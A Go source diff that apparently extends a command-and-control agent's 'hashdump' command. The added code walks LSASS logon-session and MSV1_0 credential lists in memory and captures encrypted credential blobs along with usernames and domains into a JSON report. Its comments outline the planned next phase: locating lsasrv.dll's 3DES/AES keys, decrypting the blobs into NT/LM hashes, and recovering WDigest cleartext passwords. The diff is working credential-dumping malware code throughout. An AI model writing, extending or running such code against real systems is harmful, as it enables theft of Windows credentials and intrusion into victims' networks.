@@ -3,7 +3,7 @@
 
 package commands
 
-// Phase 2B + 2C-i orchestrator for hashdump in-situ:
+// Phase 2B + 2C-i + 2C-ii-a orchestrator for hashdump in-situ:
 //
 //   1. Run Phase 1 LSA enumeration to get an authoritative LUID → username
 //      map (cross-reference oracle).
@@ -19,13 +19,21 @@ package commands
 //      is cross-referenced against the Phase 1 LUID set as the primary
 //      validation; a byte-scan fallback (Phase 2B oracle) flags nodes whose
 //      structured LUID is zero so layout drift is visible rather than silent.
-//   6. Emit a structured JSON report (one entry per walked node) plus a
-//      summary header.
+//   6. For every node with a non-zero credentials_ptr, walk the
+//      KIWI_MSV1_0_CREDENTIAL_LIST chain (Phase 2C-ii-a), dereference each
+//      KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope, and capture the
+//      encrypted blob bytes alongside the parsed UserName/Domain/AuthPackage.
+//      The encrypted ciphertext is opaque at this stage — Phase 2C-ii-b will
+//      sigscan h3DesKey/hAesKey out of lsasrv.dll and BCryptDecrypt it.
+//   7. Emit a structured JSON report (one entry per walked node, with a
+//      nested credentials array when applicable) plus a summary header.
 //
-// Phase 2C-ii will dereference the Credentials pointer captured here, locate
-// h3DesKey/hAesKey via lsasrv.dll exports, and BCryptDecrypt MSV1_0
-// credential blobs to surface NT hashes (and WDigest cleartext where
-// available).
+// Phase 2C-ii-b will sigscan lsasrv.dll for the h3DesKey/hAesKey BCRYPT_KEY
+// globals via RIP-relative back-reference from LsaProtectMemory /
+// LsaUnprotectMemory exports, BCryptImportKey them into the agent process,
+// BCryptDecrypt every blob captured here, and parse the plaintext
+// KIWI_MSV1_0_PRIMARY_CREDENTIAL into NT/LM/SHA hashes (with WDigest
+// cleartext when g_fParameter_UseLogonCredential is set).
 
 import (
 	"encoding/hex"
@@ -54,37 +62,60 @@ func (r lsassRemoteReader) Read(addr uintptr, size uint32) ([]byte, error) {
 // LogonSessionList node, with Phase 2C-i structured fields layered on top
 // of the Phase 2B walk metadata.
 type insituFullNodeReport struct {
-	Address          string   `json:"address"`
-	Flink            string   `json:"flink"`
-	Blink            string   `json:"blink"`
-	ParsedLUID       string   `json:"parsed_luid,omitempty"`
-	ParsedUserName   string   `json:"parsed_username,omitempty"`
-	ParsedDomain     string   `json:"parsed_domain,omitempty"`
-	ParsedAuthPkg    string   `json:"parsed_auth_package,omitempty"`
-	ParsedLogonType  string   `json:"parsed_logon_type,omitempty"`
-	ParsedLogonSrv   string   `json:"parsed_logon_server,omitempty"`
-	CredentialsPtr   string   `json:"credentials_ptr,omitempty"`
-	Phase1Match      bool     `json:"phase1_luid_match"`
-	Phase1Source     string   `json:"phase1_match_source,omitempty"` // "structured" | "byte-scan-fallback"
-	MatchedUsers     []string `json:"matched_users,omitempty"`
-	ParseErrors      []string `json:"parse_errors,omitempty"`
-	RawPreviewHex    string   `json:"raw_preview_hex"`
+	Address          string                       `json:"address"`
+	Flink            string                       `json:"flink"`
+	Blink            string                       `json:"blink"`
+	ParsedLUID       string                       `json:"parsed_luid,omitempty"`
+	ParsedUserName   string                       `json:"parsed_username,omitempty"`
+	ParsedDomain     string                       `json:"parsed_domain,omitempty"`
+	ParsedAuthPkg    string                       `json:"parsed_auth_package,omitempty"`
+	ParsedLogonType  string                       `json:"parsed_logon_type,omitempty"`
+	ParsedLogonSrv   string                       `json:"parsed_logon_server,omitempty"`
+	CredentialsPtr   string                       `json:"credentials_ptr,omitempty"`
+	Phase1Match      bool                         `json:"phase1_luid_match"`
+	Phase1Source     string                       `json:"phase1_match_source,omitempty"` // "structured" | "byte-scan-fallback"
+	MatchedUsers     []string                     `json:"matched_users,omitempty"`
+	ParseErrors      []string                     `json:"parse_errors,omitempty"`
+	RawPreviewHex    string                       `json:"raw_preview_hex"`
+	Credentials      []insituFullCredentialReport `json:"credentials,omitempty"`
+	CredentialWalkErr string                      `json:"credential_walk_err,omitempty"`
+}
+
+// insituFullCredentialReport is the JSON projection of a single
+// KIWI_MSV1_0_CREDENTIAL_LIST entry walked from a session's credentials_ptr
+// (Phase 2C-ii-a). The encrypted blob is captured as opaque bytes — Phase
+// 2C-ii-b will decrypt and parse it.
+type insituFullCredentialReport struct {
+	Address             string   `json:"address"`
+	AuthPackageId       uint32   `json:"auth_package_id"`
+	AuthPackage         string   `json:"auth_package"`
+	PrimaryCredsAddr    string   `json:"primary_credentials_address,omitempty"`
+	ParsedUserName      string   `json:"parsed_username,omitempty"`
+	ParsedDomain        string   `json:"parsed_domain,omitempty"`
+	EncryptedAddress    string   `json:"encrypted_address,omitempty"`
+	EncryptedLength     uint16   `json:"encrypted_length,omitempty"`
+	EncryptedHexPreview string   `json:"encrypted_hex_preview,omitempty"`
+	ParseErrors         []string `json:"parse_errors,omitempty"`
+	PrimaryReadErr      string   `json:"primary_read_err,omitempty"`
 }
 
 // insituFullSummary captures the top-level metadata of a hashdump in-situ
-// full run (Phase 2B walk + Phase 2C-i structured parse).
+// full run (Phase 2B walk + Phase 2C-i structured parse + Phase 2C-ii-a
+// credential-list walk).
 type insituFullSummary struct {
-	Phase1SessionCount int                    `json:"phase1_session_count"`
-	LSASSPID           uint32                 `json:"lsass_pid"`
-	LsasrvBase         string                 `json:"lsasrv_base"`
-	LsasrvSize         uint32                 `json:"lsasrv_size"`
-	AnchorAddr         string                 `json:"logon_session_list_anchor"`
-	StructLayout       string                 `json:"struct_layout"`
-	NodesWalked        int                    `json:"nodes_walked"`
-	NodesMatched       int                    `json:"nodes_matched_to_phase1"`
-	NodesStructParsed  int                    `json:"nodes_with_structured_luid"`
-	UnmatchedLUIDs     []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
-	Nodes              []insituFullNodeReport `json:"nodes"`
+	Phase1SessionCount   int                    `json:"phase1_session_count"`
+	LSASSPID             uint32                 `json:"lsass_pid"`
+	LsasrvBase           string                 `json:"lsasrv_base"`
+	LsasrvSize           uint32                 `json:"lsasrv_size"`
+	AnchorAddr           string                 `json:"logon_session_list_anchor"`
+	StructLayout         string                 `json:"struct_layout"`
+	NodesWalked          int                    `json:"nodes_walked"`
+	NodesMatched         int                    `json:"nodes_matched_to_phase1"`
+	NodesStructParsed    int                    `json:"nodes_with_structured_luid"`
+	NodesWithCredentials int                    `json:"nodes_with_credential_list"`
+	CredentialBlobsCaptured int                 `json:"credential_blobs_captured"`
+	UnmatchedLUIDs       []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
+	Nodes                []insituFullNodeReport `json:"nodes"`
 }
 
 // executeInsituFull runs the full Phase 2B credential-discovery flow and
@@ -152,6 +183,8 @@ func executeInsituFull() structs.CommandResult {
 	reports := make([]insituFullNodeReport, 0, len(nodes))
 	matchedNodes := 0
 	structParsed := 0
+	nodesWithCreds := 0
+	credBlobsCaptured := 0
 	for _, n := range nodes {
 		preview := 32
 		if len(n.Raw) < preview {
@@ -211,6 +244,54 @@ func executeInsituFull() structs.CommandResult {
 		if report.Phase1Match {
 			matchedNodes++
 		}
+
+		// Phase 2C-ii-a: walk the credential list at credentials_ptr. The walk
+		// is independent of Phase 1 cross-referencing — we report on every
+		// node that exposes a non-zero pointer, including nodes whose
+		// structured LUID didn't match Phase 1 (so layout-drift cases still
+		// surface ciphertext for inspection).
+		if parsed.CredentialsPtr != 0 {
+			creds, walkErr := walkCredentialList(reader, parsed.CredentialsPtr, credentialListMaxEntries)
+			if walkErr != nil {
+				report.CredentialWalkErr = walkErr.Error()
+			}
+			if len(creds) > 0 {
+				nodesWithCreds++
+				report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
+				for _, c := range creds {
+					credReport := insituFullCredentialReport{
+						Address:       fmt.Sprintf("0x%X", c.Address),
+						AuthPackageId: c.AuthPackageId,
+						AuthPackage:   c.AuthPackageName,
+					}
+					if c.PrimaryCredentialsDataPtr != 0 {
+						credReport.PrimaryCredsAddr = fmt.Sprintf("0x%X", c.PrimaryCredentialsDataPtr)
+					}
+					if c.PrimaryReadErr != "" {
+						credReport.PrimaryReadErr = c.PrimaryReadErr
+					}
+					if c.Primary != nil {
+						credReport.ParsedUserName = c.Primary.UserName
+						credReport.ParsedDomain = c.Primary.Domain
+						if c.Primary.EncryptedAddress != 0 {
+							credReport.EncryptedAddress = fmt.Sprintf("0x%X", c.Primary.EncryptedAddress)
+						}
+						credReport.EncryptedLength = c.Primary.EncryptedLength
+						if len(c.Primary.EncryptedBytes) > 0 {
+							previewLen := len(c.Primary.EncryptedBytes)
+							if previewLen > 64 {
+								previewLen = 64
+							}
+							credReport.EncryptedHexPreview = hex.EncodeToString(c.Primary.EncryptedBytes[:previewLen])
+							credBlobsCaptured++
+						}
+						credReport.ParseErrors = c.Primary.ParseErrors
+					}
+					report.Credentials = append(report.Credentials, credReport)
+				}
+			}
+		}
+
 		reports = append(reports, report)
 	}
 
@@ -222,17 +303,19 @@ func executeInsituFull() structs.CommandResult {
 	}
 
 	summary := insituFullSummary{
-		Phase1SessionCount: len(phase1),
-		LSASSPID:           pid,
-		LsasrvBase:         fmt.Sprintf("0x%X", mod.Base),
-		LsasrvSize:         mod.Size,
-		AnchorAddr:         fmt.Sprintf("0x%X", anchor),
-		StructLayout:       layout.Name,
-		NodesWalked:        len(nodes),
-		NodesMatched:       matchedNodes,
-		NodesStructParsed:  structParsed,
-		UnmatchedLUIDs:     unmatched,
-		Nodes:              reports,
+		Phase1SessionCount:      len(phase1),
+		LSASSPID:                pid,
+		LsasrvBase:              fmt.Sprintf("0x%X", mod.Base),
+		LsasrvSize:              mod.Size,
+		AnchorAddr:              fmt.Sprintf("0x%X", anchor),
+		StructLayout:            layout.Name,
+		NodesWalked:             len(nodes),
+		NodesMatched:            matchedNodes,
+		NodesStructParsed:       structParsed,
+		NodesWithCredentials:    nodesWithCreds,
+		CredentialBlobsCaptured: credBlobsCaptured,
+		UnmatchedLUIDs:          unmatched,
+		Nodes:                   reports,
 	}
 
 	jsonBytes, err := json.MarshalIndent(summary, "", "  ")
@@ -250,7 +333,8 @@ func executeInsituFull() structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("[+] Walked %d node(s) cleanly\n", len(nodes)))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Layout: %s — %d/%d node(s) yielded a non-zero structured LUID\n", layout.Name, structParsed, len(nodes)))
-	sb.WriteString(fmt.Sprintf("[+] Cross-referenced %d/%d Phase 1 LUID(s) into walked nodes\n\n", len(matchedLUIDs), len(luidsOrdered)))
+	sb.WriteString(fmt.Sprintf("[+] Cross-referenced %d/%d Phase 1 LUID(s) into walked nodes\n", len(matchedLUIDs), len(luidsOrdered)))
+	sb.WriteString(fmt.Sprintf("[+] Credential lists: %d node(s) yielded credential entries; %d encrypted blob(s) captured (Phase 2C-ii-a — decryption in 2C-ii-b)\n\n", nodesWithCreds, credBlobsCaptured))
 	sb.WriteString(string(jsonBytes))
 	return successResult(sb.String())
 }
